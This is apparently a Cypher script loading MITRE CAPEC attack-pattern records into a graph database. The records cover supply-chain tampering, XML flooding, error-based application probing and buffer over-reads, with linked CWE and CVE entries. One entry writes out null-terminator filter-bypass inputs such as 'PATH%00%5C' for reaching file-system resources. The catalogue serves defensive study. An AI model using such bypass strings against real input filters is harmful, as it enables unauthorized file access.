CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">An attacker realizes that there is a postfix data that gets in the way of getting to the desired resources</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker then ads a postfix NULL terminator to the supplied input in order to \"swallow\" the postfixed data when the insertion is taking place. With the postfix data that got in the way of the attack gone, the doors are opened for accessing the desired resources.</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.52.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{local_id: "R.52.2", title: "Adobe Acrobat/Acrobat Reader ActiveX Control Buffer Overflow Vulnerability", publisher: "Verisign, Inc.", pubdate: "August 13, 2004", link: "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=126"});
MERGE (:Reference{local_id: "R.52.3", title: "PHP Input Validation Vulnerabilities", link: "http://msgs.securepoint.com/bugtraq/"});
MERGE (:CWE{id: 158});
MERGE (:CWE{id: 172});
MERGE (:CWE{id: 173});
MERGE (:CWE{id: 171});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 707});
CREATE (:AttackPattern{id: 520, name: "Counterfeit Hardware Component Inserted During Product Assembly", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 389, text: "<div level=\"0\">\n  <p class=\"text\">The attacker will need either physical access or be able to supply malicious hardware components to the product development facility.</p>\n</div>"});
CREATE (:Submission{id: 460});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 301});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 454, summary: "OrderedDict([('Text', 'An attacker with either direct access to the product assembly process or to the supply of subcomponents used in the product assembly process introduces counterfeit hardware components into product assembly. The assembly containing the counterfeit components results in a system specifically designed for malicious purposes.')])"});
MERGE (:Reference{id: "REF-50", local_id: "R.520.1", author: "John F. Miller", title: "Supply Chain Attack Framework and Attack Patterns", publisher: "The MITRE Corporation", pubdate: "2013", link: "http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf"});
CREATE (:AttackPattern{id: 521, name: "Hardware Design Specifications Are Altered", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 390, text: "<div level=\"0\">\n  <p class=\"text\">Advanced knowledge of hardware capabilities of a manufacturer's product.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 391, text: "<div level=\"0\">\n  <p class=\"text\">Access to the manufacturer's documentation.</p>\n</div>"});
CREATE (:Submission{id: 461});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 302});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 455, summary: "OrderedDict([('Text', \"An attacker with access to a manufacturer's hardware manufacturing process documentation alters the design specifications, which introduces flaws advantageous to the attacker once the system is deployed.\")])"});
MERGE (:Reference{id: "REF-50", local_id: "R.521.1", author: "John F. Miller", title: "Supply Chain Attack Framework and Attack Patterns", publisher: "The MITRE Corporation", pubdate: "2013", link: "http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf"});
CREATE (:AttackPattern{id: 522, name: "Malicious Hardware Component Replacement", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 392, text: "<div level=\"0\">\n  <p class=\"text\">Physical access to the system after it has left the manufacturer but before it is deployed at the victim location.</p>\n</div>"});
CREATE (:Submission{id: 462});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 303});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 456, summary: "OrderedDict([('Text', 'An attacker replaces legitimate hardware in the system with faulty counterfeit or tampered hardware in the supply chain distribution channel, with purpose of causing malicious disruption or allowing for additional compromise when the system is deployed.')])"});
MERGE (:Reference{id: "REF-50", local_id: "R.522.1", author: "John F. Miller", title: "Supply Chain Attack Framework and Attack Patterns", publisher: "The MITRE Corporation", pubdate: "2013", link: "http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf"});
CREATE (:AttackPattern{id: 523, name: "Malicious Software Implanted", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 393, text: "<div level=\"0\">\n  <p class=\"text\">Physical access to the system after it has left the manufacturer but before it is deployed at the victim location.</p>\n</div>"});
CREATE (:Submission{id: 463});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 304});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 457, summary: "OrderedDict([('Text', 'An attacker implants malicious software into the system in the supply chain distribution channel, with purpose of causing malicious disruption or allowing for additional compromise when the system is deployed.')])"});
MERGE (:Reference{id: "REF-50", local_id: "R.523.1", author: "John F. Miller", title: "Supply Chain Attack Framework and Attack Patterns", publisher: "The MITRE Corporation", pubdate: "2013", link: "http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf"});
CREATE (:AttackPattern{id: 524, name: "Rogue Integration Procedures", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 394, text: "<div level=\"0\">\n  <p class=\"text\">Physical access to an integration facility that prepares the system before it is deployed at the victim location.</p>\n</div>"});
CREATE (:Submission{id: 464});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 305});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 458, summary: "OrderedDict([('Text', 'An attacker alters or establishes rogue processes in an integration facility in order to insert maliciously altered components into the system. The attacker would then supply the malicious components. This would allow for malicious disruption or additional compromise when the system is deployed.')])"});
MERGE (:Reference{id: "REF-50", local_id: "R.524.1", author: "John F. Miller", title: "Supply Chain Attack Framework and Attack Patterns", publisher: "The MITRE Corporation", pubdate: "2013", link: "http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf"});
CREATE (:AttackPattern{id: 528, name: "XML Flood", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 395, text: "<div level=\"0\">\n  <p class=\"text\">This type of an attack requires the ability to generate a large amount of XML based messages to send to a target service.</p>\n</div>"});
CREATE (:Submission{id: 465});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 459, summary: "OrderedDict([('Text', 'An adversary may execute a flooding attack using XML messages with the intent to deny legitimate users access to a web service. These attacks are accomplished by sending a large number of XML based requests and letting the service attempt to parse each one.')])"});
CREATE (:AttackPattern{id: 529, name: "Malware-Directed Internal Reconnaissance", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 466});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 460, summary: "OrderedDict([('Text', 'Adversary uses malware or a similarly controlled application installed inside an organizational perimeter to gather information about the composition, configuration, and security mechanisms of a targeted application, system or network.')])"});
CREATE (:AttackPattern{id: 53, name: "Postfix, Null Terminate, and Backslash", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 396, text: "<div level=\"0\">\n  <p class=\"text\">Null terminators are not properly handled by the filter.</p>\n</div>"});
CREATE (:Submission{id: 467});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 306});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 461, summary: "OrderedDict([('Text', 'If a string is passed through a filter of some kind, then a terminal NULL may not be valid. Using alternate representation of NULL allows an attacker to embed the NULL mid-string while postfixing the proper data so that the filter is avoided. One example is a filter that looks for a trailing slash character. If a string insertion is possible, but the slash must exist, an alternate encoding of NULL in mid-string may be used.')])"});
CREATE (:AttackPhase{id: 1, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker first probes to figure out what restrictions on input are placed by filter, such as a specific characters on the end of the URL.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker then injects a string of their choosing with a null terminator (using an alternate encoding such as %00), followed by a backslash (%5C), followed by some additional characters that are required to keep the filter happy</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The malicious string then passes through the filter and passed to the underlying API. Everything after the null terminator is ignored. This may give an attacker the opportunity to access file system resources to which they should not have access and do other things.</p>\n  <p class=\"text\">Some popular forms in which this takes place:</p>\n  <div level=\"1\">\n    <p class=\"code\">PATH%00%5C</p>\n    <p class=\"code\">PATH[0x00][0x5C]</p>\n    <p class=\"code\">PATH[alternate encoding of the NULL][additional characters required to pass filter]</p>\n  </div>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.53.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 158});
MERGE (:CWE{id: 172});
MERGE (:CWE{id: 173});
MERGE (:CWE{id: 171});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 707});
CREATE (:AttackPattern{id: 530, name: "Provide Counterfeit Component", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 397, text: "<div level=\"0\">\n  <p class=\"text\">Advanced knowledge about the target system and sub-components.</p>\n</div>"});
CREATE (:Submission{id: 468});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 307});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"});
CREATE (:PreviousEntryName{id: 87, name: "Counterfeit Component Supplied"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 462, summary: "OrderedDict([('Text', 'An attacker provides a counterfeit component during the procurement process of a lower-tier component supplier to a sub-system developer or integrator, which is then built into the system being upgraded or repaired by the victim, allowing the attacker to cause disruption or additional compromise.')])"});
MERGE (:Reference{id: "REF-50", local_id: "R.530.1", author: "John F. Miller", title: "Supply Chain Attack Framework and Attack Patterns", publisher: "The MITRE Corporation", pubdate: "2013", link: "http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf"});
CREATE (:AttackPattern{id: 531, name: "Hardware Component Substitution", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 398, text: "<div level=\"0\">\n  <p class=\"text\">Physical access to the system or the integration facility where hardware components are kept.</p>\n</div>"});
CREATE (:Submission{id: 469});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 308});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Description Summary, Examples-Instances, References, Related_Attack_Patterns, Typical_Likelihood_of_Exploit"});
CREATE (:PreviousEntryName{id: 88, name: "Hardware Component Substitution After Installation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 463, summary: "OrderedDict([('Text', 'An attacker substitutes out a tested and approved hardware component for a maliciously-altered hardware component. This type of attack is carried out directly on the system, enabling the attacker to then cause disruption or additional compromise.')])"});
CREATE (:AttackPattern{id: 532, name: "Altered Installed BIOS", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 399, text: "<div level=\"0\">\n  <p class=\"text\">Advanced knowledge about the installed target system design.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 400, text: "<div level=\"0\">\n  <p class=\"text\">Advanced knowledge about the download and update installation processes.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 401, text: "<div level=\"0\">\n  <p class=\"text\">Access to the download and update system(s) used to deliver BIOS images.</p>\n</div>"});
CREATE (:Submission{id: 470});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 309});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated References, Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 89, name: "Altered BIOS Installed After Installation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 464, summary: "OrderedDict([('Text', 'An attacker with access to download and update system software sends a maliciously altered BIOS to the victim or victim supplier/integrator, which when installed allows for future exploitation.')])"});
MERGE (:Reference{id: "REF-50", local_id: "R.532.1", author: "John F. Miller", title: "Supply Chain Attack Framework and Attack Patterns", publisher: "The MITRE Corporation", pubdate: "2013", link: "http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf"});
MERGE (:Reference{local_id: "R.532.2", author: "ATT&CK Project", title: "Basic Input/Output System (1019)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Basic_Input/Output_System"});
CREATE (:AttackPattern{id: 533, name: "Malicious Manual Software Update", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 402, text: "<div level=\"0\">\n  <p class=\"text\">Advanced knowledge about the download and update installation processes.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 403, text: "<div level=\"0\">\n  <p class=\"text\">Advanced knowledge about the deployed system and its various software subcomponents and processes.</p>\n</div>"});
CREATE (:Submission{id: 471});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 310});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, References, Related_Attack_Patterns, Typical_Likelihood_of_Exploit"});
CREATE (:PreviousEntryName{id: 90, name: "Malicious Software Update"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 465, summary: "OrderedDict([('Text', \"An attacker introduces malicious code to the victim's system by altering the payload of a software update, allowing for additional compromise or site disruption at the victim location. These manual, or user-assisted attacks, vary from requiring the user to download and run an executable, to as streamlined as tricking the user to click a URL. Attacks which aim at penetrating a specific network infrastructure often rely upon secondary attack methods to achieve the desired impact. Spamming, for example, is a common method employed as an secondary attack vector. Thus the attacker has in his or her arsenal a choice of initial attack vectors ranging from traditional SMTP/POP/IMAP spamming and its varieties, to web-application mechanisms which commonly implement both chat and rich HTML messaging within the user interface.\")])"});
CREATE (:AttackPattern{id: 534, name: "Malicious Hardware Update", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 472});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 311});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Description Summary, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 466, summary: "OrderedDict([('Text', 'An attacker introduces malicious hardware during an update or replacement procedure, allowing for additional compromise or site disruption at the victim location.')])"});
MERGE (:Reference{id: "REF-50", local_id: "R.534.1", author: "John F. Miller", title: "Supply Chain Attack Framework and Attack Patterns", publisher: "The MITRE Corporation", pubdate: "2013", link: "http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf"});
CREATE (:AttackPattern{id: 535, name: "Malicious Gray Market Hardware", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 404, text: "<div level=\"0\">\n  <p class=\"text\">Physical access to a gray market reseller's hardware components supply, or the ability to appear as a gray market reseller to the victim's buyer.</p>\n</div>"});
CREATE (:Submission{id: 473});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 312});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Examples-Instances, Related_Attack_Patterns, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 467, summary: "OrderedDict([('Text', 'An attacker maliciously alters hardware components that will be sold on the gray market, allowing for victim disruption and compromise when the victim needs replacement hardware components for systems where the parts are no longer in regular supply from original suppliers, or where the hardware components from the attacker seems to be a great benefit from a cost perspective.')])"});
MERGE (:Reference{id: "REF-50", local_id: "R.535.1", author: "John F. Miller", title: "Supply Chain Attack Framework and Attack Patterns", publisher: "The MITRE Corporation", pubdate: "2013", link: "http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf"});
CREATE (:AttackPattern{id: 536, name: "Data Injected During Configuration", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 405, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have previously compromised the victim's systems or have physical access to the victim's systems.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 406, text: "<div level=\"0\">\n  <p class=\"text\">Advanced knowledge of software and hardware capabilities of a manufacturer's product.</p>\n</div>"});
CREATE (:Submission{id: 474});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 313});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 314});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Examples-Instances, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 468, summary: "OrderedDict([('Text', \"An attacker with access to data files and processes on a victim's system injects false data into critical operational data during configuration or recalibration, causing the victim's system to perform in a suboptimal manner that benefits the attacker.\")])"});
MERGE (:Reference{id: "REF-50", local_id: "R.536.1", author: "John F. Miller", title: "Supply Chain Attack Framework and Attack Patterns", publisher: "The MITRE Corporation", pubdate: "2013", link: "http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf"});
CREATE (:AttackPattern{id: 537, name: "Infiltration of Hardware Development Environment", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 407, text: "<div level=\"0\">\n  <p class=\"text\">The victim must use email or removable media from systems running the IDE (or systems adjacent to the IDE systems).</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 408, text: "<div level=\"0\">\n  <p class=\"text\">The victim must have a system running exploitable applications and/or a vulnerable configuration to allow for initial infiltration.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 409, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have working knowledge of some if not all of the components involved in the IDE system as well as the infrastructure.</p>\n</div>"});
CREATE (:Submission{id: 475});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 315});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 469, summary: "OrderedDict([('Text', \"An attacker, leveraging the ability to manipulate components of primary support systems and tools within the development and production environments, inserts malicious software within the hardware and/or firmware development environment. The infiltration purpose is to alter developed hardware components in a system destined for deployment at the victim's organization, for the purpose of disruption or further compromise.\")])"});
MERGE (:Reference{id: "REF-50", local_id: "R.537.1", author: "John F. Miller", title: "Supply Chain Attack Framework and Attack Patterns", publisher: "The MITRE Corporation", pubdate: "2013", link: "http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf"});
CREATE (:AttackPattern{id: 538, name: "Open Source Libraries Altered", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 410, text: "<div level=\"0\">\n  <p class=\"text\">Access to the open source code base being used by the manufacturer in a system being developed or currently deployed at a victim location.</p>\n</div>"});
CREATE (:Submission{id: 476});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 316});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 470, summary: "OrderedDict([('Text', 'An attacker with access to an open source code project and knowledge of its particular use for in a system being developed, manufactured, or supported for the victim, can insert malicious code into the open source software used for math libraries in anticipation of inclusion into the system for the purpose of disruption or further compromise within the victim organization.')])"});
MERGE (:Reference{id: "REF-50", local_id: "R.538.1", author: "John F. Miller", title: "Supply Chain Attack Framework and Attack Patterns", publisher: "The MITRE Corporation", pubdate: "2013", link: "http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf"});
CREATE (:AttackPattern{id: 539, name: "ASIC With Malicious Functionality", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 411, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have working knowledge of some if not all of the components involved in the target system as well as the infrastructure and development environment of the manufacturer.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 412, text: "<div level=\"0\">\n  <p class=\"text\">Advanced knowledge about the ASIC installed within the target system.</p>\n</div>"});
CREATE (:Submission{id: 477});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 317});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 471, summary: "OrderedDict([('Text', 'An attacker with access to the development environment process of an application-specific integrated circuit (ASIC) for a victim system being developed or maintained after initial deployment can insert malicious functionality into the system for the purpose of disruption or further compromise.')])"});
MERGE (:Reference{id: "REF-50", local_id: "R.539.1", author: "John F. Miller", title: "Supply Chain Attack Framework and Attack Patterns", publisher: "The MITRE Corporation", pubdate: "2013", link: "http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf"});
CREATE (:AttackPattern{id: 54, name: "Query System for Information", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 413, text: "<div level=\"0\">\n  <p class=\"text\">This class of attacks does not strictly require authorized access to the application. As Attackers use this attack process to classify, map, and identify vulnerable aspects of an application, it simply requires hypotheses to be verified, interaction with the application, and time to conduct trial-and-error activities.</p>\n</div>"});
CREATE (:Submission{id: 478});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 318});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Description Summary"});
CREATE (:PreviousEntryName{id: 91, name: "Probe Application Error Reporting"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 472, summary: "OrderedDict([('Text', \"An adversary, aware of an application's location (and possibly authorized to use the application), probes an application's structure and evaluates its robustness by submitting requests and examining responses. Often, this is accomplished by sending variants of expected queries in the hope that these modified queries might return information beyond what the expected set of queries would provide.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Determine user-controllable parameters of the application</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Inject each parameter with content that causes an error condition to manifest</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Modify the content of each parameter according to observed error conditions</p>\n</div>"});
CREATE (:AttackStep{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Repeat above steps with enough parameters until the application has been sufficiently mapped out to launch desired attack (for example, Blind SQL Injection)</p>\n</div>"});
MERGE (:Reference{id: "REF-3", local_id: "R.54.1", title: "Common Weakness Enumeration (CWE)", section: "CWE-20 - Input Validation", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/20.html"});
MERGE (:Reference{id: "REF-3", local_id: "R.54.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-390 - Improper Error Handling", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/390.html"});
MERGE (:CWE{id: 209});
MERGE (:CWE{id: 248});
MERGE (:CWE{id: 717});
CREATE (:ResourcesRequired{id: 234, text: "<div level=\"0\">\n  <p class=\"text\">The Attacker needs the ability to probe application functionality and provide it erroneous directives or data without triggering intrusion detection schemes or making enough of an impact on application logging that steps are taken against the attacker.</p>\n  <p class=\"text\">The Attack does not need special hardware, software, skills, or access.</p>\n</div>"});
CREATE (:AttackPattern{id: 540, name: "Overread Buffers", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 414, text: "<div level=\"0\">\n  <p class=\"text\">For this type of attack to be successful, a few prerequisites must be met. First, the targeted software must be written in a language that enables fine grained buffer control. (e.g., c, c++) Second, the targeted software must actually perform buffer operations and inadequately perform bounds-checking on those buffer operations. Finally, the adversary must have the capability to influence the input that guides these buffer operations.</p>\n</div>"});
CREATE (:Submission{id: 479});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 473, summary: "OrderedDict([('Text', 'An adversary attacks a target by providing input that causes an application to read beyond the boundary of a defined buffer. This typically occurs when a value influencing where to start or stop reading is set to reflect positions outside of the valid memory location of the buffer. This type of attack may result in exposure of sensitive information, a system crash, or arbitrary code execution.')])"});
CREATE (:CVE{id: "CVE-2014-1895", description: "<div level=\"0\">\n  <p class=\"text\">Off-by-one error in the flask_security_avc_cachestats function in xsm/flask/flask_op.c in Xen 4.2.x and 4.3.x, when the maximum number of physical CPUs are in use, allows local users to cause a denial of service (host crash) or obtain sensitive information from hypervisor memory by leveraging a FLASK_AVC_CACHESTAT hypercall, which triggers a buffer over-read.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2014-0704", description: "<div level=\"0\">\n  <p class=\"text\">The IGMP implementation on Cisco Wireless LAN Controller (WLC) devices 4.x, 5.x, 6.x, 7.0 before 7.0.250.0, 7.1, 7.2, and 7.3, when IGMPv3 Snooping is enabled, allows remote attackers to cause a denial of service (memory over-read and device restart) via a crafted field in an IGMPv3 message, aka Bug ID CSCuh33240.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2014-0160", description: "<div level=\"0\">\n  <p class=\"text\">The (1) TLS and (2) DTLS implementations in OpenSSL 1.0.1 before 1.0.1g do not properly handle Heartbeat Extension packets, which allows remote attackers to obtain sensitive information from process memory via crafted packets that trigger a buffer over-read, as demonstrated by reading private keys, related to d1_both.c and t1_lib.c, aka the Heartbleed bug.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2013-6712", description: "<div level=\"0\">\n  <p class=\"text\">The scan function in ext/date/lib/parse_iso_intervals.c in PHP through 5.5.6 does not properly restrict creation of DateInterval objects, which might allow remote attackers to cause a denial of service (heap-based buffer over-read) via a crafted interval specification.</p>\n</div>"});
